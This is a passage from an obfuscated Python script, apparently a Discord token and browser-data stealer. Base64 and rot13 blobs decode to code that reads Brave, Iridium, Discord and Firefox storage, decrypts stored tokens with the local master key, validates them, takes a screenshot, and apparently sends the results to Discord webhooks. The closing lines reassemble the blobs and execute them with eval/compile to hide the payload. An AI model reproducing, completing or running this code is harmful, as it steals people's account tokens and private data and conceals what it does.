RGVmYXVsdFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYlxcJywNCiAgICAgICAgICAgICdCcmF2ZSc6IHNlbGYuYXBwZGF0YSArIHInXFxCcmF2ZVNvZnR3YXJlXFxCcmF2ZS1Ccm93c2VyXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcsDQogICAgICAgICAgICAnSXJpZGl1bSc6IHNlbGYuYXBwZGF0YSArIHInXFxJcmlkaXVtXFxVc2VyIERhdGFcXERlZmF1bHRcXExvY2FsIFN0b3JhZ2VcXGxldmVsZGJcXCcNCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgZm9yIF8sIHBhdGggaW4gcGF0aHMuaXRlbXMoKToNCiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgaWYgbm90ICJkaXNjb3JkIiBpbiBwYXRoOg0KICAgICAgICAgICAgICAgIGZvciBmaWxlX25hbWUgaW4gb3MubGlzdGRpcihwYXRoKToNCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxvZycpIGFuZCBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubGRiJyk6DQogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7cGF0aH1cXHtmaWxlX25hbWV9JywgZXJyb3JzPSdpZ25vcmUnKS5yZWFkbGluZXMoKSBpZiB4LnN0cmlwKCldOg0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHJlZ2V4IGluIChzZWxmLnJlZ2V4KToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgdG9rZW4gaW4gZmluZGFsbChyZWdleCwgbGluZSk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoc2VsZi5iYXNldXJsLCBoZWFkZXJzPXNlbGYuZ2V0aGVhZGVycyh0b2tlbikpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXNzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHIuc3RhdHVzX2NvZGUgPT0gMjAwIGFuZCB0b2tlbiBub3QgaW4gc2VsZi50b2tlbnM6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnRva2Vucy5hcHBlbmQodG9rZW4pDQogICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHNlbGYucm9hbWluZysnXFxkaXNjb3JkXFxMb2NhbCBTdGF0ZScpOg0KICAgICAgICAgICAgICAgICAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIocGF0aCk6DQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgZmlsZV9uYW1lLmVuZHN3aXRoKCcubG9nJykgYW5kIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sZGInKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGxpbmUgaW4gW3guc3RyaXAoKSBmb3IgeCBpbiBvcGVuKGYne3BhdGh9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgeSBpbiBmaW5kYWxsKHNlbGYuZW5jcnlwdGVkX3JlZ2V4LCBsaW5lKToNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9rZW4gPSBOb25lDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRva2VuID0gc2VsZi5kZWNyeXB0X3Bhc3N3b3JkKGJhc2U2NC5iNjRkZWNvZGUoeVs6eS5maW5kKCciJyldLnNwbGl0KCdkUXc0dzlXZ1hjUTonKVsxXSksIHNlbGYuZ2V0X21hc3Rlcl9rZXkoc2VsZi5yb2FtaW5nKydcXGRpc2NvcmRcXExvY2FsIFN0YXRlJykpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KHNlbGYuYmFzZXVybCwgaGVhZGVycz1zZWxmLmdldGhlYWRlcnModG9rZW4pKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMCBhbmQgdG9rZW4gbm90IGluIHNlbGYudG9rZW5zOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50b2tlbnMuYXBwZW5kKHRva2VuKQ0KDQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHNlbGYucm9hbWluZysiXFxNb3ppbGxhXFxGaXJlZm94XFxQcm9maWxlcyIpOg0KICAgICAgICAgICAgZm9yIHBhdGgsIF8sIGZpbGVzIGluIG9zLndhbGsoc2VsZi5yb2FtaW5nKyJcXE1vemlsbGFcXEZpcmVmb3hcXFByb2ZpbGVzIik6DQogICAgICAgICAgICAgICAgZm9yIF9maWxlIGluIGZpbGVzOg0KICAgICAgICAgICAgICAgICAgICBpZiBub3QgX2ZpbGUuZW5kc3dpdGgoJy5zcWxpdGUnKToNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlDQogICAgICAgICAgICAgICAgICAgIGZvciBsaW5lIGluIFt4LnN0cmlwKCkgZm9yIHggaW4gb3BlbihmJ3twYXRofVxce19maWxlfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToNCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAoc2VsZi5yZWdleCk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIHRva2VuIGluIGZpbmRhbGwocmVnZXgsIGxpbmUpOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMuZ2V0KHNlbGYuYmFzZXVybCwgaGVhZGVycz1zZWxmLmdldGhlYWRlcnModG9rZW4pKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMCBhbmQgdG9rZW4gbm90IGluIHNlbGYudG9rZW5zOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50b2tlbnMuYXBwZW5kKHRva2VuKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgDQogICAgZGVmIHNjcmVlbnNob3Qoc2VsZik6DQogICAgICAgIGltYWdlID0gSW1hZ2VHcmFiLmdyYWIoDQogICAgICAgICAgICBiYm94PU5vbmUsIA0KICAgICAgICAgICAgaW5jbHVkZV9sYXllcmVkX3dpbmRvd3M9RmFsc2UsIA0KICAgICAgICAgICAgYWxsX3NjcmVlbnM9RmFsc2UsIA0KICAgICAgICAgICAgeGRpc3BsYXk9Tm9uZQ0KICAgICAgICApDQogICAgICAgIHRlbXBmb2xkZXIgPSBvcy5nZXRlbnYoInRlbXAiKSsiXFxUaHVuZGVyIg0KICAgICAgICB0cnk6DQogICAgICAgICAgICBvcy5ta2Rpcihvcy5wYXRoLmpvaW4odGVtcGZvbGRlcikpDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246DQogICAgICAgICAgICBwYXNzDQ'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))